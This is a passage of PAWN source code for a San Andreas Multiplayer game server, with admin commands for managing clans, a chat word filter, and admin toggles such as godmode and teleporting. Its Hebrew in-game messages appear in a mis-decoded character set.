			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bot color [red] [green] [blue] :öåøú äùéîåù");
			new rgb[3];
			rgb[0] = strval(cmd);
			for(new i=1;i<3;i++) cmd = strtok(cmdtext,idx), rgb[i] = !strlen(cmd) || !IsNumeric(cmd)? rgb[i-1]:strval(cmd);
			botcolor = rgba2hex(rgb[0],rgb[1],rgb[2],255);
			SendClientMessage(playerid,botcolor," .öáò äáåè ùåðä ìöáò ääåãòä äæàú");
		}
		else if(equal(cmd,"allow"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /bot allow [on/off] :öåøú äùéîåù");
			if(equal(cmd,"on"))
			{
				boton = 1;
				SendClientMessage(playerid,green," .äáåè äåôòì");
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else if(equal(cmd,"off"))
			{
				boton = 0;
				SendClientMessage(playerid,green," .äáåè ëåáä");
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		}
		else return SendClientMessage(playerid,red," .ô÷åãú áåè ùâåéä");
		return 1;
	}
	if(equal(cmd,"/clhelp") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		SendClientMessage(playerid,lightblue," ~~~ :ô÷åãåú îðäìé ÷ìàðéí ~~~");
		SendClientMessage(playerid,yellow," /clhelp  /createclan  /dclan  /setclan  /clannumber  /setleader  /clanname");
		SendClientMessage(playerid,yellow," /getcbank  /setcbank  /telehq  /createcbank");
	    return 1;
	}
	if(equal(cmd,"/createclan") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new name[256], string[M_S], clanid, Float:p[4];
		name = strrest(cmdtext,idx);
		if(name[0] == ' ') strdel(name,0,1);
		if(!strlen(name)) return SendClientMessage(playerid,white," /createclan [clan name] :öåøú äùéîåù");
		if(strlen(name) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .ùí àøåê îãé");
		for(new i=0;i<strlen(name);i++) if(name[i] < '0' && name[i] > '9' && name[i] < 'a' && name[i] > 'z' && name[i] < 'A' && name[i] > 'Z' && name[i] != '_' && name[i] != '[' && name[i] != ']') return SendClientMessage(playerid,red," .çì÷ îäàåúéåú áëéðåé ùëúáú ìà éëåìåú ìäëðñ ìùí ùì ÷ìàï");
		format(string,sizeof(string),"/DM/Clans/%s.ini",name);
		if(fexist(string)) return SendClientMessage(playerid,red," .ä÷ìàï äæä ëáø ÷ééí");
		clanid = fgetint(file_clans,"Count");
		fcreate(string);
		fsetint(string,"ID",clanid);
		fsetint(string,"R",255);
		fsetint(string,"G",255);
		fsetint(string,"B",255);
		fsetint(string,"Bank2",0);
		fsetstring(string,"Name",name);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		fsetfloat(string,"X",p[0]);
		fsetfloat(string,"Y",p[1]);
		fsetfloat(string,"Z",p[2]);
		fsetfloat(string,"Rot",p[3]);
		fsetfloat(string,"VX",p[0]);
		fsetfloat(string,"VY",p[1]);
		fsetfloat(string,"VZ",p[2]);
		fsetfloat(string,"VR",p[3]);
		fsetint(string,"LockBank",0);
		fsetint(string,"MaxBank",1000000);
		fsetfloat(string,"CPX",p[0]);
		fsetfloat(string,"CPY",p[1]);
		fsetfloat(string,"CPZ",p[2]);
		format(claninfo[clanid][cname],256,name);
		claninfo[clanid][cmembers] = 0;
		claninfo[clanid][cbank] = 0;
		claninfo[clanid][cbankcp] = -1;
		claninfo[clanid][cvalid] = 1;
		for(new i=0;i<4;i++) claninfo[clanid][ccolor][i == 3? 2:i] = 255, claninfo[clanid][chq][i] = p[i], claninfo[clanid][chqv][i] = p[i];
		fsetstring(string,"Command",name);
		for(new i=1;i<MAX_CLANS;i++) claninfo[clanid][cpeace][i] = 0, claninfo[i][cpeace][clanid] = 0;
		claninfo[clanid][ctest] = 0;
		claninfo[clanid][cmute] = 0;
		format(claninfo[clanid][ccmd],256,name);
		claninfo[clanid][clbank] = 0;
		claninfo[clanid][cmaxbank] = 1000000;
		format(string,sizeof(string)," .\"%s\" éöøú àú ä÷ìàï",name);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," îñôø ÷ìàï: %d",clanid);
		SendClientMessage(playerid,green,string);
		fsetint(file_clans,"Count",clanid+1);
		valstr(string,clanid);
		fsetstring(file_clans,string,name);
		return 1;
	}
	if(equal(cmd,"/dclan") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new string[M_S], clanid;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dclan [clan name] :öåøú äùéîåù");
		clanid = clannumber(cmd);
		if(clanid == -1) return SendClientMessage(playerid,red," .÷ìàï ùâåé");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(playerinfo[i][clan] == clanid)
			{
				PlayerLeaveClan(i,3);
				SendClientMessage(i,red," .äàãîéï îç÷ àú ä÷ìàï ùìê");
			}
		}
		format(string,sizeof(string),"/DM/Clans/%s.ini",cmd);
		claninfo[clanid][cvalid] = 0;
		for(new i=1;i<MAX_CLANS;i++) claninfo[clanid][cpeace][i] = 0, claninfo[i][cpeace][clanid] = 0;
		fremove(string);
		valstr(string,clanid);
		fsetstring(file_clans,string,"None");
		format(string,sizeof(string)," .\"%s\" îç÷ú àú ä÷ìàï",cmd);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setclan") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /setclan [id/name] [clan name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][clan] && !equal(cmd2,"None")) return SendClientMessage(playerid,red," .äùç÷ï ùáçøú ëáø á÷ìàï");
		c = equal(cmd2,"None")? 0:clannumber(cmd2);
		if(c == -1) return SendClientMessage(playerid,red," .÷ìàï ùâåé");
		if(!c)
		{
			format(string,sizeof(string)," .\"%s\" îä÷ìàï %s äåöàú àú",claninfo[playerinfo[id][clan]][cname],GetName(id));
			PlayerLeaveClan(id,3);
			SendClientMessage(playerid,green,string);
		}
		else
		{
			for(new j=0;j<claninfo[c][cmembers];j++)
			{
				format(string,sizeof(string)," .öåøó ì÷ìàï ùìê òì éãé äàãîéï %s",GetName(id));
				SendClientMessage(claninfo[c][cplayers][j],green,string);
			}
			playerinfo[id][clan] = c;
			claninfo[c][cplayers][claninfo[c][cmembers]] = id;
			claninfo[c][cmembers]++;
			SetPlayerColor(id,rgba2hex(claninfo[c][ccolor][0],claninfo[c][ccolor][1],claninfo[c][ccolor][2],100));
			format(string,sizeof(string)," .òì éãé äàãîéï \"%s\" öåøôú ì÷ìàï",claninfo[playerinfo[id][clan]][cname]);
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .\"%s\" ì÷ìàï %s öéøôú àú",claninfo[playerinfo[id][clan]][cname],GetName(id));
			SendClientMessage(playerid,green,string);
			if(playerinfo[id][logged]) fsetstring(fuser(id),"Clan2",claninfo[playerinfo[id][clan]][cname]);
			playerinfo[id][iclan] = 0;
		}
		return 1;
	}
	if(equal(cmd,"/clannumber") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new cstring[M_S], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /clannumber [clan name] :öåøú äùéîåù");
		format(cstring,sizeof(cstring),"/DM/Clans/%s.ini",cmd);
		if(!fexist(cstring)) return SendClientMessage(playerid,red," .ä÷ìàï ìà ðîöà àå ùä÷ìàï ìà øùîé");
		format(string,sizeof(string)," .äåà %d %s îñôø ä÷ìàï",fgetint(cstring,"ID"),cmd);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setleader") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setleader [id/name] [leader? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][clan] == 0)
		{
			format(string,sizeof(string)," .ìà á÷ìàï %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][lclan])
			{
				format(string,sizeof(string)," .ëáø ìéãø %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][lclan])
			{
				format(string,sizeof(string)," .ìà ìéãø %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			c = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(c)
		{
			SendClientMessage(id,green," .äàãîéï äôê àåúê ììéãø òì ä÷ìàï ùìê");
			format(string,sizeof(string)," .ììéãø ÷ìàï %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .äàãîéï äåøéã ìê àú äìéãø òì ä÷ìàï ùìê");
			format(string,sizeof(string)," .àú äìéãø òì ä÷ìàï %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][lclan] = c;
		if(playerinfo[id][logged]) fsetint(fuser(id),"Leader",c);
		return 1;
	}
	if(equal(cmd,"/clanname") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new cmd2[256], c, string[M_S], string2[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /clanname [clan name] [clan name] :öåøú äùéîåù");
		c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .÷ìàï ùâåé");
		//for(new i=1;i<MAX_CLANS;i++) if(equal(cmd2,claninfo[i][cname])) return SendClientMessage(playerid,red," .ùí ä÷ìàï ëáø áùéîåù");
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
		format(string2,sizeof(string2),"/DM/Clans/%s.ini",cmd2);
		if(fexist(string2)) return SendClientMessage(playerid,red," .ä÷ìàï äæä ëáø ÷ééí");
		#if usingYSF
			frename(string,string2);
		#else
			fcreate(string2);
			format(claninfo[c][cname],256,cmd2);
			fsetstring(string,"Name",cmd2);
			fcopytextfile(string,string2);
			fremove(string);
		#endif
		valstr(string2,c);
		fsetstring(file_clans,string2,cmd2);
		format(claninfo[c][cname],256,cmd2);
		format(string2,sizeof(string2),"/DM/Clans/%s.ini",cmd2);
		fsetstring(string2,"Name",cmd2);
		format(string,sizeof(string)," .%s ùéðéú àú äùí ùì ÷ìàï îñôø %d ì",cmd2,c);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/getcbank") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /getcbank [clan name] :öåøú äùéîåù");
		c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .îñôø ÷ìàï ùâåé");
		format(string,sizeof(string)," .äåà %d$ %s îñôø äëñó ááð÷ ùì ä÷ìàï",claninfo[c][cbank],claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setcbank") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new cmd2[256], c, b, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setcbank [clan name] [bank money] :öåøú äùéîåù");
		c = clannumber(cmd), b = strval(cmd2);
		if(c == -1) return SendClientMessage(playerid,red," .îñôø ÷ìàï ùâåé");
		if(b < 0) return SendClientMessage(playerid,red," .ñëåí ùâåé");
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
		claninfo[c][cbank] = b;
		fsetint(string,"Bank2",b);
		format(string,sizeof(string)," .ì %d$ %s ùéðéú àú îñôø äëñó ááð÷ ùì ä÷ìàï",b,claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/telehq") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][clanmanager]))
	{
		if((playerinfo[playerid][admin] < 11 && !playerinfo[playerid][clanmanager]) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /telehq [clan name] :öåøú äùéîåù");
		c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .îñôø ÷ìàï ùâåé");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,claninfo[c][chq][0]+floatrand(-1.0,1.0),claninfo[c][chq][1]+floatrand(-1.0,1.0),claninfo[c][chq][2]);
				SetPlayerFacingAngle(playerid,claninfo[c][chq][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),claninfo[c][chqv][0]+floatrand(-3.0,3.0),claninfo[c][chqv][1]+floatrand(-3.0,3.0),claninfo[c][chqv][2]);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),claninfo[c][chqv][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",claninfo[c][cname]);
		GameTextForPlayer(playerid,string,1500,4);
		format(string,sizeof(string)," !%s áøåëéí äáàéí ìîô÷ãú",claninfo[c][cname]);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/antiword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		new string[M_S], File:fwords, wstring[128];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /antiword [word] :öåøú äùéîåù");
		fwords = fopen(file_words,fexist(file_words)? io_read:io_readwrite);
		while(fread(fwords,string)) if(equal(cmd,string)) return SendClientMessage(playerid,red," .äîéìä äæå ëáø ðîöàú áøùéîä");
		fclose(fwords);
		SendClientMessage(playerid,green," :äåñôú ìîòøëú äöéðæåø àú äîéìä");
		SendClientMessage(playerid,green,cmd);
		format(string,sizeof(string),"%s\r\n",cmd);
		fwords = fopen(file_words,io_append);
		fwrite(fwords,string);
		fclose(fwords);
		words_count = 0;
		fwords = fopen(file_words,io_read);
		while(fread(fwords,wstring))
		{
			fixchars(wstring);
			for(new i=0;i<strlen(wstring);i++) if(wstring[i] == '\n' || wstring[i] == '\r') wstring[i] = '\0';
			words[words_count] = wstring, words_count++;
		}
		return 1;
	}
	if(equal(cmd,"/givecc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /givecc [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][ccard])
		{
			format(string,sizeof(string)," .ëáø éù ëøèéñ àùøàé %s ì",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][ccard] = 1;
		format(string,sizeof(string)," .%s ðúú ëøèéñ àùøàé ì",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .÷éáìú îäàãîéï ëøèéñ àùøàé");
		if(playerinfo[id][logged]) fsetint(fuser(id),"CCard",1);
		return 1;
	}
	if(equal(cmd,"/removecc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /removecc [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!playerinfo[id][ccard])
		{
			format(string,sizeof(string)," .àéï ëøèéñ àùøàé %s ì",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][ccard] = 0;
		format(string,sizeof(string)," .%s îç÷ú àú ëøèéñ äàùøàé ùì",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .äàãîéï îç÷ àú ëøèéñ äàùøàé ùìê");
		if(playerinfo[id][logged]) fsetint(fuser(id),"CCard",0);
		return 1;
	}
	if(equal(cmd,"/godmod") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /godmod [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][gm]) return SendClientMessage(playerid,red," .àúä ëáø áîöá âåãîåã");
			SetPlayerHealth2(playerid,100000.0);
			if(IsPlayerInAnyVehicle(playerid)) SetVehicleHealth(GetPlayerVehicleID(playerid),10000.0);
			playerinfo[playerid][gm] = 1;
			SendClientMessage(playerid,green," .îöá âåãîåã äåôòì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][gm]) return SendClientMessage(playerid,red," .àúä ìà áîöá âåãîåã");
			SetPlayerHealth2(playerid,100.0);
			if(IsPlayerInAnyVehicle(playerid)) SetVehicleHealth(GetPlayerVehicleID(playerid),1000.0);
			playerinfo[playerid][gm] = 0;
			SendClientMessage(playerid,green," .îöá âåãîåã äåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/noreload") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /noreload [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][nr]) return SendClientMessage(playerid,red," .àúä ëáø áîöá àéï èòéðä");
			playerinfo[playerid][nr] = 1;
			SendClientMessage(playerid,green," .îöá àéï èòéðä äåôòì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][nr]) return SendClientMessage(playerid,red," .àúä ìà áîöá àéï èòéðä");
			playerinfo[playerid][nr] = 0;
			SendClientMessage(playerid,green," .îöá àéï èòéðä äåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/abf") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /abf [on/off] :öåøú äùéîåù");
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][abf][0]) return SendClientMessage(playerid,red," .Anti Bike Fall àúä ëáø áîöá");
			playerinfo[playerid][abf][0] = 1;
			playerinfo[playerid][abf][1] = GetPlayerState(playerid) == PLAYER_STATE_DRIVER ? GetPlayerVehicleID(playerid) : INVALID_VEHICLE_ID;
			SendClientMessage(playerid,green," .äåôòì Anti Bike Fall îöá");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][abf][0]) return SendClientMessage(playerid,red," .Anti Bike Fall àúä ìà áîöá");
			playerinfo[playerid][abf][0] = 0;
			playerinfo[playerid][abf][1] = INVALID_VEHICLE_ID;
			SendClientMessage(playerid,green," .äåôñ÷ Anti Bike Fall îöá");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/getall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new string[M_S], Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] < playerinfo[playerid][admin]) SetPlayerPos(i,p[0]+floatrand(-1.0,1.0),p[1]+floatrand(-1.0,1.0),p[2]);
		format(string,sizeof(string)," .ùéâø àú ëåìí àìéå %s äàãîéï",GetName(playerid));
		SendClientMessageToAll(orange,string);
		return 1;
	}
	if(equal(cmd,"/setfight") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new cmd2[M_S], id, value, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setfight [id/name] [fighting style id] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2);
		if(!playerinfo[playerid][pp] && (value < 4 || (value > 7 && value != 15 && value != 26))) return SendClientMessage(playerid,red," .òøê ùâåé");
		format(string,sizeof(string)," .ìñåâ îñôø %d %s ùéðéú àú ñåâ äîëåú ùì",value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú ñåâ äîëåú ùìê ìñåâ îñôø %d",value);
		SendClientMessage(id,green,string);
		SetPlayerFightingStyle(id,value);
		return 1;
	}
	if(equal(cmd,"/setskill") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new cmd2[M_S], cmd3[M_S], id, value, s, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx), cmd3 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2) || !strlen(cmd3) || !IsNumeric(cmd3)) return SendClientMessage(playerid,white," /setskill [id/name] [skill id] [skill] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		value = strval(cmd2), s = strval(cmd3);
		if(!playerinfo[playerid][pp] && (value < 0 || value > 10)) return SendClientMessage(playerid,red," .òøê ùâåé");
		if(!playerinfo[playerid][pp] && (s < 0 || s > 2000)) return SendClientMessage(playerid,red," .ñ÷éì ùâåé");
		format(string,sizeof(string)," .ì %d %s ùéðéú àú äñ÷éì áðù÷ %d ùì",s,value,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äàãîéï ùéðä àú äñ÷éì ùìê áðù÷ %d ì %d",s,value);
		SendClientMessage(id,green,string);
		SetPlayerSkillLevel(playerid,value,s);
		return 1;
	}
	if(equal(cmd,"/setvelocity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 13 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 13");
		new id, Float:p[3], t, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		for(new i=0;i<3;i++)
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsFloat(cmd)) return SendClientMessage(playerid,white," /setvelocity [id/name] [x] [y] [z] [type 1= + 2= - 3= =] :öåøú äùéîåù");
			p[i] = floatstr(cmd);
			if(p[i] < -20000.0 || p[i] > 20000.0) return SendClientMessage(playerid,red," .îé÷åí ùâåé");
		}
		cmd = strtok(cmdtext,idx), t = strval(cmd);
		if(t < 1 || t > 3) return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		format(string,sizeof(string)," .ì %.4f,%.4f,%.4f %s ùéðéú àú äîäéøåú ùì",p[0],p[1],p[2],GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .äàãîéï ùéðä àú àú äîäéøåú ùìê");
